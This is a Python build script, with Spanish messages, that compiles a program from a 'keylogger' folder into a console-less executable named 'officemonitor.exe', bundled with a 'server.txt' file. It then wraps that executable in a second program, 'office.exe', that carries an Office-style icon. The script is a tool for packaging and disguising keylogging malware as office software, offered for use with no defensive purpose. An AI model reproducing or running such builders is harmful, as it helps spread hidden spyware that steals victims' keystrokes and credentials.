import os
import subprocess
import time
import shutil
from colorama import Fore, Back, Style, init
import threading
import sys

init(autoreset=True)

def barra_carga_animada(proceso, total=20, stop_event=None):
    animacion = ['-', '/', '\\', '|']
    i = 0
    while not stop_event.is_set():
        simbolo = animacion[i % len(animacion)]
        print(f"{Fore.LIGHTGREEN_EX}{proceso.name} ({simbolo})", end='\r')
        time.sleep(0.1)
        i += 1
    print(f"{Fore.LIGHTWHITE_EX}{proceso.name} {Fore.LIGHTGREEN_EX}100%{Style.RESET_ALL}")

def ejecutar_comando(comando):
    try:
        resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if resultado.returncode != 0:
            print(f"{Fore.RED}[ERROR] {resultado.stderr.decode().strip()}")
            return False
        return True
    except Exception as e:
        print(f"{Fore.RED}Ocurrió un error: {e}")
        return False

def mover_archivo(origen, destino):
    try:
        shutil.move(origen, destino)
        return True
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {origen} no encontrado.")
        return False
    except Exception as e:
        print(f"{Fore.RED}[ERROR] No se pudo mover el archivo: {e}")
        return False

class ProcesoCompilacion(threading.Thread):
    def __init__(self, nombre, comando):
        super().__init__()
        self.name = nombre
        self.comando = comando
        self.finished = False

    def run(self):
        self.finished = not ejecutar_comando(self.comando)

    def is_finished(self):
        return self.finished

def abrir_carpeta(ruta):
    carpeta = os.path.dirname(ruta)
    if os.name == 'nt':
        subprocess.run(['explorer', carpeta], shell=True)
    else:
        subprocess.run(['xdg-open', carpeta], shell=True)

def cerrar_compilador():
    print(f"{Fore.RED}Cerrando el compilador...")
    sys.exit(0)

def main():
    print(f"{Fore.LIGHTBLUE_EX}Procesando...")

    os.chdir("keylogger")

    print(f"{Fore.WHITE}Correcto. {Fore.LIGHTCYAN_EX}Iniciando...")
    comando1 = (
        'pyinstaller --onefile --noconsole '
        '--add-data "officemonitor.py;." '
        '--add-data "server.txt;." '
        '--add-data "mlogo.ico;package" '
        '--icon=mlogo.ico officemonitor.py'
    )

    stop_event1 = threading.Event()

    proceso1 = ProcesoCompilacion("Compilando officemonitor.py", comando1)
    animacion_thread = threading.Thread(target=barra_carga_animada, args=(proceso1, 20, stop_event1))
    animacion_thread.start()

    proceso1.start()
    proceso1.join()
    stop_event1.set()
    animacion_thread.join()

    if proceso1.is_finished():
        print(f"{Fore.RED}Error al compilar officemonitor.py")
        return

    os.chdir("dist")
    if not mover_archivo("officemonitor.exe", "../package/"):
        return
    os.chdir("..")

    print(f"{Fore.LIGHTGREEN_EX}Compilando...")
    comando2 = (
        'pyinstaller --onefile --noconsole '
        '--add-data "package/index.html;package" '
        '--add-data "package/officemonitor.exe;package" '
        '--add-data "package/logo.ico;package" '
        '--icon=package/logo.ico office.py'
    )

    stop_event2 = threading.Event()

    proceso2 = ProcesoCompilacion("Compilando office.py", comando2)
    animacion_thread = threading.Thread(target=barra_carga_animada, args=(proceso2, 20, stop_event2))
    animacion_thread.start()

    proceso2.start()
    proceso2.join()
    stop_event2.set()
    animacion_thread.join()

    if proceso2.is_finished():
        print(f"{Fore.RED}Error al compilar office.py")
        return

    os.chdir("dist/")    
    if mover_archivo("office.exe", "../../"):
        nueva_ruta = os.path.abspath("../../office.exe")
        print(f"{Fore.LIGHTGREEN_EX}Proceso de compilación completado con éxito.")
        print(f"{Fore.GREEN}Ruta: {Fore.WHITE}{nueva_ruta}")
    print(f"{Fore.LIGHTCYAN_EX}Usa '99' para abrir la ruta que contiene office.exe o '00' para volver al menú.")
    
    while True:
        user_input = input(f"{Fore.LIGHTCYAN_EX}$: ")
        if user_input == '99':
            abrir_carpeta(nueva_ruta)
            break
        elif user_input == '00':
            cerrar_compilador()
        else:
            print(f"{Fore.RED}Entrada no válida, intenta de nuevo.")

if __name__ == "__main__":
    main()
